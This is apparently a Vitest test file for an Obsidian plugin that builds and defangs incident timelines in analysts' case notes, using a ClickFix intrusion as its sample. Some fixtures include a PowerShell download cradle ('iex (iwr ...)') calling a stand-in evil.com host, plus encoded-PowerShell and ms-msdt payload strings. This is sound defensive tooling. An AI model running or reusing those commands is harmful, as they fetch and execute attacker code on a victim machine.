import type { Editor, EditorPosition, EditorTransaction } from 'obsidian'
import { describe, expect, it } from 'vitest'
import {
  type TimelineEdit,
  addEventAtEnd,
  addEventBelow,
  applyEdit,
  backToPlainList,
  copyText,
  defangTimeline,
  deleteEvent,
  makeTimeline,
  moveEvent,
  selectedLines,
  setEventKind,
  sortEventsByTime
} from './actions'
import { defangText } from '../soc/toolbox'
import { TIMELINE_MARKER, copyForTicket, findTimelines } from './parse'

/** The ClickFix sample from the design spec, as it sits in a case note. */
const CLICKFIX = [
  '## Findings:',
  '%% timeline %%',
  '- On 3 May 2025, 11:04 the user was observed using Microsoft Edge …',
  '- At 11:05:40, the user was observed visiting hxxps://eemmbryequo[.]shop/ (…).',
  '    - Following the navigation, the webpage hosted a script …',
  '- At 11:06:12, Execution: the user opened Run (Win+R) and pasted `powershell …` (T1204.004)',
  '- At 11:06:15, Download: the payload was fetched from promptcraft[.]online.',
  '    - Source: EDR process tree',
  '- At 11:31, Detection: XDR raised "Suspicious PowerShell download cradle" on corp-wks-102.',
  '- Response: the SOC isolated corp-wks-102 from the network.'
]

/** The note after an edit, as a list of lines. */
function apply(lines: string[], edit: TimelineEdit | null): string[] {
  if (!edit) throw new Error('no edit')
  return [...lines.slice(0, edit.fromLine), ...edit.text.split('\n'), ...lines.slice(edit.toLine + 1)]
}

/** The text of every event in the note's first timeline. */
function texts(lines: string[]): string[] {
  return findTimelines(lines)[0].events.map((e) => e.text)
}

describe('makeTimeline', () => {
  it('puts the marker above the list the caret is in', () => {
    const note = ['## Findings:', '- one', '- two', '    - detail', '- three', '', 'After.']
    for (const caret of [1, 2, 3, 4]) {
      const out = apply(note, makeTimeline(note, caret, caret))
      expect(out).toEqual(['## Findings:', TIMELINE_MARKER, ...note.slice(1)])
    }
  })

  it('finds the first line across a single blank line and continuation lines', () => {
    const note = ['Intro.', '', '- one', '  continued', '', '- two']
    const out = apply(note, makeTimeline(note, 5, 5))
    expect(out).toEqual(['Intro.', '', TIMELINE_MARKER, '- one', '  continued', '', '- two'])
    expect(texts(out)).toEqual(['one', 'two'])
  })

  it('stops at two blank lines, as the timeline itself would', () => {
    const note = ['- one', '', '', '- two']
    expect(apply(note, makeTimeline(note, 3, 3))).toEqual(['- one', '', '', TIMELINE_MARKER, '- two'])
  })

  it('indents the marker like the list', () => {
    const note = ['Steps:', '  * one', '  * two']
    const out = apply(note, makeTimeline(note, 2, 2))
    expect(out[1]).toBe(`  ${TIMELINE_MARKER}`)
    expect(texts(out)).toEqual(['one', 'two'])
  })

  it('is one replacement that only adds the marker line when the caret is in a list', () => {
    const note = ['- one', '- two']
    expect(makeTimeline(note, 1, 1)).toEqual({ fromLine: 0, toLine: 1, text: `${TIMELINE_MARKER}\n- one\n- two` })
  })

  it('offers nothing outside a list', () => {
    const note = ['A paragraph.', '', '- one', '    code under a paragraph?']
    expect(makeTimeline(note, 0, 0)).toBeNull()
    expect(makeTimeline(note, 1, 1)).toBeNull()
    expect(makeTimeline(['Para', '    indented', '- x'], 1, 1)).toBeNull()
    expect(makeTimeline(['## Heading'], 0, 0)).toBeNull()
    expect(makeTimeline([''], 0, 0)).toBeNull()
  })

  it('offers nothing in a timeline already', () => {
    for (let line = 1; line < CLICKFIX.length; line++) expect(makeTimeline(CLICKFIX, line, line)).toBeNull()
    expect(makeTimeline(CLICKFIX, 0, 4)).toBeNull()
  })

  it('offers nothing in a code block, where the marker would be an example', () => {
    const note = ['```', '- one', '- two', '```']
    expect(makeTimeline(note, 1, 1)).toBeNull()
  })

  it('makes selected plain lines into events, blank lines and headings left alone', () => {
    const note = ['## Findings:', '11:04 the user opened Edge', '', '11:05 visited a page', '- 11:06 ran a command', '']
    const out = apply(note, makeTimeline(note, 0, 5))
    expect(out).toEqual([
      '## Findings:',
      TIMELINE_MARKER,
      '- 11:04 the user opened Edge',
      '',
      '- 11:05 visited a page',
      '- 11:06 ran a command',
      ''
    ])
    expect(findTimelines(out)[0].events).toHaveLength(3)
  })

  it('keeps an indented line under an event as its detail, and the indent of a prefixed line', () => {
    const note = ['  first', '      more about it', '  second']
    const out = apply(note, makeTimeline(note, 0, 2))
    expect(out).toEqual([`  ${TIMELINE_MARKER}`, '  - first', '      more about it', '  - second'])
    expect(findTimelines(out)[0].events[0].details.map((d) => d.text)).toEqual(['more about it'])
  })

  it('keeps a selected indented line as the detail of the event above the selection', () => {
    const note = ['- one', '    continued', 'two']
    expect(apply(note, makeTimeline(note, 1, 2))).toEqual([TIMELINE_MARKER, '- one', '    continued', '- two'])
  })

  it('takes in the list just above a selection of plain lines', () => {
    const note = ['- one', 'two', 'three']
    const out = apply(note, makeTimeline(note, 1, 2))
    expect(out).toEqual([TIMELINE_MARKER, '- one', '- two', '- three'])
  })

  it('makes nothing when the selection would not become one timeline', () => {
    expect(makeTimeline(['one', '## Next', 'two'], 0, 2)).toBeNull()
    expect(makeTimeline(['one', '', '', 'two'], 0, 3)).toBeNull()
    // Less indented than the first line, so not part of its list.
    expect(makeTimeline(['    first', 'second'], 0, 1)).toBeNull()
  })

  it('makes nothing over a selection with a code block, a numbered list or a divider in it', () => {
    const code = ['## Findings:', '- At 11:05 ran:', '```', 'powershell -enc AAA', '```', '- At 11:06 next']
    expect(makeTimeline(code, 0, 5)).toBeNull()
    expect(makeTimeline(['- a', '~~~', 'b', '~~~'], 0, 3)).toBeNull()
    expect(makeTimeline(['1. At 11:04 a', '2. At 11:05 b'], 0, 1)).toBeNull()
    expect(makeTimeline(['11:04 a', '3) b'], 0, 1)).toBeNull()
    for (const divider of ['---', '***', '- - -', ' _ _ _']) {
      expect(makeTimeline(['11:04 a', divider, '11:05 b'], 0, 2)).toBeNull()
    }
  })

  it("keeps a code block that is an event's detail when making a timeline over a list", () => {
    const note = ['- At 11:05 ran:', '  ```', '  # stage 1', '', '', '  ```', '- At 11:06 next']
    expect(apply(note, makeTimeline(note, 0, 6))).toEqual([TIMELINE_MARKER, ...note])
    expect(apply(note, makeTimeline(note, 6, 6))).toEqual([TIMELINE_MARKER, ...note])
    // The fence opened on the bullet itself.
    const own = ['- ```sh', '  # stage 1', '', '', '  ```', '- At 11:06 next']
    expect(apply(own, makeTimeline(own, 5, 5))).toEqual([TIMELINE_MARKER, ...own])
  })

  it('makes nothing in YAML frontmatter', () => {
    const note = ['---', 'tags:', '  - malware', 'assignees:', '  - Farhan', '---', '- a', '- b']
    for (const line of [0, 1, 2, 4, 5]) expect(makeTimeline(note, line, line)).toBeNull()
    expect(makeTimeline(note, 4, 7)).toBeNull()
    expect(apply(note, makeTimeline(note, 6, 6))).toEqual([...note.slice(0, 6), TIMELINE_MARKER, '- a', '- b'])
  })
})

describe('selectedLines', () => {
  const editor = (from: EditorPosition, to: EditorPosition) =>
    ({ getCursor: (which: string) => (which === 'from' ? from : to) }) as unknown as Editor

  it('leaves out the line a selection ends at column 0 of (a triple-click, Shift+Down)', () => {
    expect(selectedLines(editor({ line: 1, ch: 0 }, { line: 3, ch: 0 }))).toEqual([1, 2])
    expect(selectedLines(editor({ line: 1, ch: 2 }, { line: 3, ch: 1 }))).toEqual([1, 3])
    expect(selectedLines(editor({ line: 2, ch: 0 }, { line: 2, ch: 0 }))).toEqual([2, 2])
    const note = ['## F', '11:04 a', '11:05 b', 'Summary para']
    const [from, to] = selectedLines(editor({ line: 1, ch: 0 }, { line: 3, ch: 0 }))
    expect(apply(note, makeTimeline(note, from, to))).toEqual([
      '## F',
      TIMELINE_MARKER,
      '- 11:04 a',
      '- 11:05 b',
      'Summary para'
    ])
  })
})

describe('addEventBelow and addEventAtEnd', () => {
  it('adds an empty event after the event and its details, caret in it', () => {
    const edit = addEventBelow(CLICKFIX, 3)
    expect(edit).toEqual({ fromLine: 4, toLine: 4, text: `${CLICKFIX[4]}\n- `, cursor: { line: 5, ch: 2 } })
    const out = apply(CLICKFIX, edit)
    expect(out[5]).toBe('- ')
    expect(findTimelines(out)[0].events).toHaveLength(7)
    // From a detail line, the same place.
    expect(addEventBelow(CLICKFIX, 4)).toEqual(edit)
  })

  it('adds the first event when the caret is on the marker', () => {
    const out = apply(CLICKFIX, addEventBelow(CLICKFIX, 1))
    expect(out.slice(1, 4)).toEqual([TIMELINE_MARKER, '- ', CLICKFIX[2]])
  })

  it('keeps the bullet and indent of the list', () => {
    const note = [TIMELINE_MARKER, '  * one', '      * detail', '  * two']
    expect(apply(note, addEventBelow(note, 1))).toEqual([
      TIMELINE_MARKER,
      '  * one',
      '      * detail',
      '  * ',
      '  * two'
    ])
    expect(addEventBelow(note, 1)?.cursor).toEqual({ line: 3, ch: 4 })
  })

  it('adds the end event after the last detail line', () => {
    const note = [...CLICKFIX.slice(0, 8), 'After.']
    const edit = addEventAtEnd(note, 1)
    expect(apply(note, edit)).toEqual([...CLICKFIX.slice(0, 8), '- ', 'After.'])
    expect(edit?.cursor).toEqual({ line: 8, ch: 2 })
  })

  it('adds an event to an empty timeline', () => {
    expect(apply([TIMELINE_MARKER], addEventAtEnd([TIMELINE_MARKER], 0))).toEqual([TIMELINE_MARKER, '- '])
    expect(apply(['x', TIMELINE_MARKER, 'y'], addEventBelow(['x', TIMELINE_MARKER, 'y'], 1))).toEqual([
      'x',
      TIMELINE_MARKER,
      '- ',
      'y'
    ])
  })

  it('offers nothing outside a timeline', () => {
    expect(addEventBelow(CLICKFIX, 0)).toBeNull()
    expect(addEventAtEnd(CLICKFIX, 0)).toBeNull()
    expect(addEventBelow(['- one'], 0)).toBeNull()
  })

  it('adds after a code block in the last event, never inside it', () => {
    const note = [
      TIMELINE_MARKER,
      '- At 11:06, Execution: ran the stager',
      '  ```powershell',
      '  # stage 1',
      '  iex (iwr hxxp://evil[.]com/a.ps1)',
      '  ```'
    ]
    expect(apply(note, addEventAtEnd(note, 0))).toEqual([...note, '- '])
    expect(apply(note, addEventBelow(note, 3))).toEqual([...note, '- '])
  })
})

describe('moveEvent', () => {
  it('swaps an event and its details with the one below, caret following', () => {
    const edit = moveEvent(CLICKFIX, 3, 'down')
    const out = apply(CLICKFIX, edit)
    expect(out.slice(3, 6)).toEqual([CLICKFIX[5], CLICKFIX[3], CLICKFIX[4]])
    expect(edit?.cursor).toEqual({ line: 4, ch: CLICKFIX[3].length })
    // Caret on the detail line moves with it.
    expect(moveEvent(CLICKFIX, 4, 'down')?.cursor).toEqual({ line: 5, ch: CLICKFIX[4].length })
  })

  it('moves an event with details up', () => {
    const out = apply(CLICKFIX, moveEvent(CLICKFIX, 6, 'up'))
    expect(out.slice(5, 8)).toEqual([CLICKFIX[6], CLICKFIX[7], CLICKFIX[5]])
    expect(moveEvent(CLICKFIX, 7, 'up')?.cursor).toEqual({ line: 6, ch: CLICKFIX[7].length })
    const note = [TIMELINE_MARKER, '- a', '  - a1', '- b', '  - b1', '  - b2']
    expect(apply(note, moveEvent(note, 4, 'up'))).toEqual([TIMELINE_MARKER, '- b', '  - b1', '  - b2', '- a', '  - a1'])
    expect(moveEvent(note, 4, 'up')?.cursor).toEqual({ line: 2, ch: 6 })
  })

  it('moves the last event up and the first down', () => {
    const last = apply(CLICKFIX, moveEvent(CLICKFIX, 9, 'up'))
    expect(last.slice(8)).toEqual([CLICKFIX[9], CLICKFIX[8]])
    const first = apply(CLICKFIX, moveEvent(CLICKFIX, 2, 'down'))
    expect(first.slice(2, 5)).toEqual([CLICKFIX[3], CLICKFIX[4], CLICKFIX[2]])
    expect(texts(first)).toHaveLength(6)
  })

  it('offers nothing past either end, on the marker or outside', () => {
    expect(moveEvent(CLICKFIX, 2, 'up')).toBeNull()
    expect(moveEvent(CLICKFIX, 9, 'down')).toBeNull()
    expect(moveEvent(CLICKFIX, 1, 'down')).toBeNull()
    expect(moveEvent(CLICKFIX, 0, 'down')).toBeNull()
  })

  it('leaves blank lines between events where they are', () => {
    const note = [TIMELINE_MARKER, '- one', '', '- two', '    - detail']
    expect(apply(note, moveEvent(note, 3, 'up'))).toEqual([TIMELINE_MARKER, '- two', '    - detail', '', '- one'])
    // A caret on the blank line belongs to the event above and lands on its last line.
    expect(moveEvent(note, 2, 'down')?.cursor).toEqual({ line: 4, ch: 5 })
  })

  it('moves events of an indented list', () => {
    const note = [TIMELINE_MARKER, '  - one', '  - two']
    expect(apply(note, moveEvent(note, 1, 'down'))).toEqual([TIMELINE_MARKER, '  - two', '  - one'])
  })
})

describe('setEventKind', () => {
  const kindOf = (lines: string[], line: number) => {
    const e = findTimelines(lines)[0].events.find((x) => x.line === line)
    return e && { kind: e.kind, explicit: e.kindExplicit }
  }

  it('writes the kind word after the time phrase and its comma', () => {
    const out = apply(CLICKFIX, setEventKind(CLICKFIX, 3, 'web'))
    expect(out[3]).toBe('- At 11:05:40, Web: the user was observed visiting hxxps://eemmbryequo[.]shop/ (…).')
    expect(kindOf(out, 3)).toEqual({ kind: 'web', explicit: true })
    expect(out.filter((_, i) => i !== 3)).toEqual(CLICKFIX.filter((_, i) => i !== 3))
  })

  it('replaces a kind word that is there', () => {
    const out = apply(CLICKFIX, setEventKind(CLICKFIX, 5, 'file'))
    expect(out[5]).toBe('- At 11:06:12, File: the user opened Run (Win+R) and pasted `powershell …` (T1204.004)')
    expect(kindOf(out, 5)).toEqual({ kind: 'file', explicit: true })
  })

  it("keeps the analyst's word when it already means that kind", () => {
    expect(setEventKind(CLICKFIX, 6, 'file')).toBeNull()
    expect(setEventKind(CLICKFIX, 8, 'detection')).toBeNull()
    expect(setEventKind([TIMELINE_MARKER, '- At 11:00, Alert: x'], 1, 'detection')).toBeNull()
  })

  it('removes the kind word for Auto, leaving the kind to the text', () => {
    const out = apply(CLICKFIX, setEventKind(CLICKFIX, 5, 'auto'))
    expect(out[5]).toBe('- At 11:06:12, the user opened Run (Win+R) and pasted `powershell …` (T1204.004)')
    expect(kindOf(out, 5)).toEqual({ kind: 'execution', explicit: false })
    const untimed = apply(CLICKFIX, setEventKind(CLICKFIX, 9, 'auto'))
    expect(untimed[9]).toBe('- the SOC isolated corp-wks-102 from the network.')
    expect(setEventKind(CLICKFIX, 2, 'auto')).toBeNull()
  })

  it('writes the kind at the start of an untimed event', () => {
    const out = apply(CLICKFIX, setEventKind(CLICKFIX, 9, 'detection'))
    expect(out[9]).toBe('- Detection: the SOC isolated corp-wks-102 from the network.')
    const note = [TIMELINE_MARKER, '  - the user replied']
    expect(apply(note, setEventKind(note, 1, 'email'))[1]).toBe('  - Email: the user replied')
  })

  it('follows a time phrase that ends in a space, a dash or nothing', () => {
    expect(apply(CLICKFIX, setEventKind(CLICKFIX, 2, 'execution'))[2]).toBe(
      '- On 3 May 2025, 11:04 Execution: the user was observed using Microsoft Edge …'
    )
    const dash = [TIMELINE_MARKER, '- 11:04 – the user', '- At 11:05', '- At 11:06,', '- 11:07:']
    const out = apply(dash, setEventKind(dash, 1, 'response'))
    expect(out[1]).toBe('- 11:04 – Response: the user')
    expect(apply(dash, setEventKind(dash, 2, 'response'))[2]).toBe('- At 11:05 Response: ')
    expect(apply(dash, setEventKind(dash, 3, 'response'))[3]).toBe('- At 11:06, Response: ')
    for (const line of [2, 3]) {
      expect(kindOf(apply(dash, setEventKind(dash, line, 'response')), line)?.explicit).toBe(true)
    }
  })

  it('keeps a key event key', () => {
    const note = [TIMELINE_MARKER, '- At 11:04, **Initial access** via the page']
    const out = apply(note, setEventKind(note, 1, 'web'))
    expect(out[1]).toBe('- At 11:04, Web: **Initial access** via the page')
    expect(findTimelines(out)[0].events[0].key).toBe(true)
  })

  it('offers nothing on the marker, outside, or for observed, which has no word', () => {
    expect(setEventKind(CLICKFIX, 1, 'web')).toBeNull()
    expect(setEventKind(CLICKFIX, 0, 'web')).toBeNull()
    expect(setEventKind(CLICKFIX, 3, 'observed')).toBeNull()
  })

  it('keeps a bare bullet a bullet', () => {
    const note = [TIMELINE_MARKER, '- At 11:05 a', '-', '- At 11:06 b']
    const out = apply(note, setEventKind(note, 2, 'detection'))
    expect(out[2]).toBe('- Detection: ')
    expect(texts(out)).toEqual(['At 11:05 a', 'Detection: ', 'At 11:06 b'])
  })

  it('writes no kind in front of a code fence on the bullet, which would end the code and the timeline', () => {
    const note = [TIMELINE_MARKER, '- ```sh', '  # stage 1', '  ```', '- At 11:06 b']
    expect(setEventKind(note, 1, 'execution')).toBeNull()
  })

  it('writes the kind after a task box and its time, keeping the task', () => {
    const note = [TIMELINE_MARKER, '- [x] At 11:05, isolated host', '- [ ] 11:06 notify', '- [ ] call the vendor']
    expect(apply(note, setEventKind(note, 1, 'response'))[1]).toBe('- [x] At 11:05, Response: isolated host')
    expect(apply(note, setEventKind(note, 2, 'email'))[2]).toBe('- [ ] 11:06 Email: notify')
    expect(apply(note, setEventKind(note, 3, 'response'))[3]).toBe('- [ ] Response: call the vendor')
    const auto = [TIMELINE_MARKER, '- [x] At 11:05, Response: isolated host']
    expect(apply(auto, setEventKind(auto, 1, 'auto'))[1]).toBe('- [x] At 11:05, isolated host')
  })
})

describe('sortEventsByTime', () => {
  it('offers nothing when the events are in order, even with an untimed one', () => {
    expect(sortEventsByTime(CLICKFIX, 3)).toBeNull()
    expect(sortEventsByTime(CLICKFIX, 0)).toBeNull()
  })

  it('sorts, details travelling with their event and blank lines staying put', () => {
    const note = [TIMELINE_MARKER, '- 11:06 c', '    - detail of c', '', '- 11:04 a', '- 11:05 b', 'After.']
    const r = sortEventsByTime(note, 1)
    if (!r || !('edit' in r)) throw new Error('expected an edit')
    expect(apply(note, r.edit)).toEqual([
      TIMELINE_MARKER,
      '- 11:04 a',
      '',
      '- 11:05 b',
      '- 11:06 c',
      '    - detail of c',
      'After.'
    ])
    // The caret stays with its event.
    expect(r.edit.cursor).toEqual({ line: 4, ch: note[1].length })
    const fromDetail = sortEventsByTime(note, 2)
    expect(fromDetail && 'edit' in fromDetail && fromDetail.edit.cursor).toEqual({ line: 5, ch: note[2].length })
  })

  it('orders by seconds only between times that both have them', () => {
    // 11:05 may be any second of that minute, so it keeps its place among the 11:05 events.
    const note = [TIMELINE_MARKER, '- 11:05:40 c', '- 11:05 a', '- 11:05 b', '- 11:05:10 b2', '- 11:04 first']
    const r = sortEventsByTime(note, 0)
    if (!r || !('edit' in r)) throw new Error('expected an edit')
    expect(texts(apply(note, r.edit))).toEqual(['11:04 first', '11:05:10 b2', '11:05 a', '11:05 b', '11:05:40 c'])
    expect(sortEventsByTime([TIMELINE_MARKER, '- 11:05:40 c', '- 11:05 a'], 0)).toBeNull()
    const ms = [TIMELINE_MARKER, '- 11:05:40.500 b', '- 11:05:40.100 a']
    expect(sortEventsByTime(ms, 0)).toBeNull()
  })

  it('keeps equal times in note order', () => {
    const note = [TIMELINE_MARKER, '- 11:06 z', '- 11:05 b', '- 11:05 a']
    const r = sortEventsByTime(note, 0)
    if (!r || !('edit' in r)) throw new Error('expected an edit')
    expect(texts(apply(note, r.edit))).toEqual(['11:05 b', '11:05 a', '11:06 z'])
  })

  it('sorts across stated dates', () => {
    const note = [TIMELINE_MARKER, '- 4 May 2025, 09:00 b', '- 3 May 2025, 23:00 a']
    const r = sortEventsByTime(note, 1)
    if (!r || !('edit' in r)) throw new Error('expected an edit')
    expect(texts(apply(note, r.edit))).toEqual(['3 May 2025, 23:00 a', '4 May 2025, 09:00 b'])
  })

  it('refuses with a reason when an event has no time', () => {
    const note = [TIMELINE_MARKER, '- 11:06 c', '- the SOC responded', '- 11:04 a']
    expect(sortEventsByTime(note, 1)).toEqual({ reason: '1 event has no time' })
    expect(sortEventsByTime([...note, '- On 3 May 2025, a date only'], 1)).toEqual({ reason: '2 events have no time' })
  })

  it('refuses with a reason when the day order is unknown', () => {
    const note = [TIMELINE_MARKER, '- 11:06 c', '- 11:04 a', '- 3 May 2025, 09:00 b']
    expect(sortEventsByTime(note, 1)).toEqual({ reason: 'Not every event has a date, so the day order is unknown' })
  })

  it('refuses when sorting would move an event onto another day', () => {
    // 10:00 is on 3 May only because it follows the 3 May event.
    const note = [TIMELINE_MARKER, '- 3 May 2025, 11:00 a', '- 10:00 b']
    expect(sortEventsByTime(note, 1)).toEqual({
      reason: 'Sorting would move an event onto another day: write its date on it first'
    })
  })

  it('offers nothing outside a timeline', () => {
    expect(sortEventsByTime(['- 11:06 b', '- 11:04 a'], 0)).toBeNull()
  })

  it('refuses when sorting would take a time-only event away from the numeric date above it', () => {
    const note = [TIMELINE_MARKER, '- At 10/9/26, 2:29 AM email sent', '- At 2:20 AM user clicked']
    expect(sortEventsByTime(note, 1)).toEqual({
      reason: 'Sorting would move an event onto another day: write its date on it first'
    })
  })

  it('never sorts clocks written in different zones', () => {
    const zones = { reason: 'The times are written in different zones, so their order is unknown' }
    const note = [TIMELINE_MARKER, '- At 11:06 UTC, a', '- At 11:04 UTC, b', '- At 07:10 EDT, c']
    expect(sortEventsByTime(note, 1)).toEqual(zones)
    expect(sortEventsByTime([TIMELINE_MARKER, '- At 11:06 UTC, a', '- At 11:04 UTC, b', '- At 11:05, c'], 1)).toEqual(
      zones
    )
    // Unordered across zones is not known to be out of order, so nothing is offered.
    expect(sortEventsByTime([TIMELINE_MARKER, '- At 13:10 +02:00, b', '- At 11:04 UTC, a'], 1)).toBeNull()
    const same = [TIMELINE_MARKER, '- At 11:06 UTC, a', '- At 11:04 UTC, b']
    const r = sortEventsByTime(same, 1)
    if (!r || !('edit' in r)) throw new Error('expected an edit')
    expect(texts(apply(same, r.edit))).toEqual(['At 11:04 UTC, b', 'At 11:06 UTC, a'])
  })
})

describe('deleteEvent', () => {
  it('removes the event and its details whole, caret on the line above', () => {
    const edit = deleteEvent(CLICKFIX, 6)
    const out = apply(CLICKFIX, edit)
    expect(out).toEqual([...CLICKFIX.slice(0, 6), ...CLICKFIX.slice(8)])
    expect(edit?.cursor).toEqual({ line: 5, ch: CLICKFIX[5].length })
    expect(apply(CLICKFIX, deleteEvent(CLICKFIX, 7))).toEqual(out)
  })

  it('removes the first, the last and the only event', () => {
    expect(apply(CLICKFIX, deleteEvent(CLICKFIX, 2))).toEqual([...CLICKFIX.slice(0, 2), ...CLICKFIX.slice(3)])
    expect(apply(CLICKFIX, deleteEvent(CLICKFIX, 9))).toEqual(CLICKFIX.slice(0, 9))
    expect(apply([TIMELINE_MARKER, '- one'], deleteEvent([TIMELINE_MARKER, '- one'], 1))).toEqual([TIMELINE_MARKER])
  })

  it('offers nothing on the marker or outside', () => {
    expect(deleteEvent(CLICKFIX, 1)).toBeNull()
    expect(deleteEvent(CLICKFIX, 0)).toBeNull()
  })

  it('leaves one blank line between events in a loose list, so the timeline stays whole', () => {
    const note = [TIMELINE_MARKER, '- a', '', '- b', '', '- c']
    const out = apply(note, deleteEvent(note, 3))
    expect(out).toEqual([TIMELINE_MARKER, '- a', '', '- c'])
    expect(texts(out)).toEqual(['a', 'c'])
    const first = [TIMELINE_MARKER, '', '- a', '', '- b']
    expect(texts(apply(first, deleteEvent(first, 2)))).toEqual(['b'])
    const last = [TIMELINE_MARKER, '- a', '', '- b', '', 'After.']
    expect(apply(last, deleteEvent(last, 3))).toEqual([TIMELINE_MARKER, '- a', '', 'After.'])
  })

  it('removes the code block in an event with it', () => {
    const note = [
      TIMELINE_MARKER,
      '- At 11:06, Execution: ran the stager',
      '  ```powershell',
      '  # stage 1',
      '  iex (iwr hxxp://evil[.]com/a.ps1)',
      '  ```',
      '- At 11:07 next',
      '- At 11:05 earlier'
    ]
    expect(apply(note, deleteEvent(note, 1))).toEqual([TIMELINE_MARKER, '- At 11:07 next', '- At 11:05 earlier'])
    const tab = [TIMELINE_MARKER, '- At 11:06 ran:', '\t```', '\t$a = 1', '', '', '\t$b = 2', '\t```', '- At 11:05 x']
    expect(apply(tab, deleteEvent(tab, 1))).toEqual([TIMELINE_MARKER, '- At 11:05 x'])
  })

  it('takes the blank lines an unclosed fence holds with its event, so the rest stays in the timeline', () => {
    const note = [TIMELINE_MARKER, '- a', '  ```', '  x', '', '', '- b', '- c']
    expect(apply(note, deleteEvent(note, 1))).toEqual([TIMELINE_MARKER, '- b', '- c'])
    const loose = [TIMELINE_MARKER, '', '- a', '  ```', '  x', '', '', '- b']
    expect(texts(apply(loose, deleteEvent(loose, 2)))).toEqual(['b'])
    expect(texts(apply(note, moveEvent(note, 1, 'down')))).toEqual(['b', 'a', 'c'])
  })
})

describe('defangTimeline', () => {
  const live = [
    'Before https://evil.example/a',
    TIMELINE_MARKER,
    '- At 11:05:40, the user visited https://eemmbryequo.shop/ (…).',
    '    - Mail from bad@evil.example',
    '- At 11:06, ran 10.0.0.5',
    'After https://evil.example/b'
  ]

  it('defangs event and detail lines only, never the marker or the note around it', () => {
    const r = defangTimeline(live, 2)
    expect(r?.changed).toBe(true)
    const out = apply(live, r?.edit ?? null)
    expect(out).toEqual([
      live[0],
      TIMELINE_MARKER,
      '- At 11:05:40, the user visited hxxps://eemmbryequo[.]shop/ (…).',
      '    - Mail from bad[at]evil[.]example',
      '- At 11:06, ran 10[.]0[.]0[.]5',
      live[5]
    ])
    expect(findTimelines(out)[0].summary.live).toBe(0)
    expect(defangTimeline(live, 1)?.changed).toBe(true)
  })

  it('says when there was nothing to defang', () => {
    const r = defangTimeline(CLICKFIX, 1)
    expect(r?.changed).toBe(false)
    expect(apply(CLICKFIX, r?.edit ?? null)).toEqual(CLICKFIX)
    expect(defangTimeline([TIMELINE_MARKER], 0)?.changed).toBe(false)
    expect(apply([TIMELINE_MARKER], defangTimeline([TIMELINE_MARKER], 0)?.edit ?? null)).toEqual([TIMELINE_MARKER])
  })

  it('offers nothing outside a timeline', () => {
    expect(defangTimeline(live, 0)).toBeNull()
  })
})

describe('backToPlainList', () => {
  it('removes only the marker line', () => {
    const out = apply(CLICKFIX, backToPlainList(CLICKFIX, 5))
    expect(out).toEqual([CLICKFIX[0], ...CLICKFIX.slice(2)])
    expect(findTimelines(out)).toEqual([])
    expect(apply(CLICKFIX, backToPlainList(CLICKFIX, 1))).toEqual(out)
  })

  it('removes a marker on the first line or alone', () => {
    expect(apply([TIMELINE_MARKER, '- one'], backToPlainList([TIMELINE_MARKER, '- one'], 1))).toEqual(['- one'])
    expect(apply([TIMELINE_MARKER], backToPlainList([TIMELINE_MARKER], 0))).toEqual([''])
    const blank = ['x', TIMELINE_MARKER, '', '- one']
    expect(apply(blank, backToPlainList(blank, 3))).toEqual(['x', '', '- one'])
  })

  it('offers nothing outside a timeline', () => {
    expect(backToPlainList(CLICKFIX, 0)).toBeNull()
  })
})

describe('copyText', () => {
  it('is the ticket copy of the timeline the caret is in', () => {
    const block = findTimelines(CLICKFIX)[0]
    expect(copyText(CLICKFIX, 1)).toBe(copyForTicket(block))
    expect(copyText(CLICKFIX, 7)).toBe(copyForTicket(block))
    expect(copyText(CLICKFIX, 0)).toBeNull()
  })

  it('defangs what Defang timeline would, before a value moves into prose', () => {
    const note = [
      TIMELINE_MARKER,
      '- At 11:05, the user browsed.',
      '    - Source: evil.com',
      '- Download: promptcraft.online',
      '- evil.org'
    ]
    expect(copyText(note, 0)?.split('\n')).toEqual([
      'Timeline (3 events)',
      '11:05      the user browsed. Source: evil[.]com',
      '--:--      Download: promptcraft[.]online (time not recorded)',
      '--:--      evil[.]org (time not recorded)'
    ])
  })

  it('agrees with the live count and Defang timeline on what is live', () => {
    const notes = [
      [TIMELINE_MARKER, '- At 11:05, the user browsed.', '    - Source: evil.com'],
      [TIMELINE_MARKER, '- At 11:05, seen 1.2.3.4,evil.com'],
      [TIMELINE_MARKER, '- At 11:05, opened file://evil-share/x.hta'],
      [TIMELINE_MARKER, '- At 11:05, ran it', '    - Payload: ms-msdt:/id PCWDiagnostic'],
      [TIMELINE_MARKER, '- At 11:05, fetched from promptcraft.online.'],
      CLICKFIX
    ]
    for (const note of notes) {
      const line = findTimelines(note)[0].markerLine
      const live = findTimelines(note)[0].summary.live
      const r = defangTimeline(note, line)
      expect(r?.changed).toBe(live > 0)
      const after = apply(note, r?.edit ?? null)
      expect(findTimelines(after)[0].summary.live).toBe(0)
      // Nothing is left for a later defang to find, and the copy is the defanged note's copy.
      const copy = copyText(note, line) ?? ''
      expect(defangText(copy)).toBe(copy)
      expect(copy).toBe(copyText(after, line))
    }
  })
})

describe('edits', () => {
  it('never write a carriage return', () => {
    const edits = [
      makeTimeline(['a', 'b'], 0, 1),
      addEventBelow(CLICKFIX, 3),
      moveEvent(CLICKFIX, 3, 'down'),
      setEventKind(CLICKFIX, 3, 'web'),
      deleteEvent(CLICKFIX, 3),
      defangTimeline(CLICKFIX, 3)?.edit ?? null,
      backToPlainList(CLICKFIX, 3)
    ]
    for (const edit of edits) expect(edit?.text).not.toMatch(/\r/)
  })
})

/** Just enough of Obsidian's Editor over a string, recording each transaction. */
class FakeEditor {
  transactions: EditorTransaction[] = []
  cursor: EditorPosition | null = null
  constructor(public doc: string) {}
  getLine(n: number): string {
    return this.doc.split('\n')[n]
  }
  posToOffset(p: EditorPosition): number {
    return this.doc
      .split('\n')
      .slice(0, p.line)
      .reduce((n, l) => n + l.length + 1, p.ch)
  }
  offsetToPos(offset: number): EditorPosition {
    const before = this.doc.slice(0, offset).split('\n')
    return { line: before.length - 1, ch: before[before.length - 1].length }
  }
  getRange(from: EditorPosition, to: EditorPosition): string {
    return this.doc.slice(this.posToOffset(from), this.posToOffset(to))
  }
  transaction(tx: EditorTransaction): void {
    this.transactions.push(tx)
    for (const c of tx.changes ?? []) {
      const from = this.posToOffset(c.from)
      this.doc = this.doc.slice(0, from) + c.text + this.doc.slice(this.posToOffset(c.to ?? c.from))
    }
  }
  setCursor(p: EditorPosition): void {
    this.cursor = p
  }
}

describe('applyEdit', () => {
  const run = (lines: string[], edit: TimelineEdit | null) => {
    if (!edit) throw new Error('no edit')
    const editor = new FakeEditor(lines.join('\n'))
    applyEdit(editor as unknown as Editor, edit)
    return editor
  }

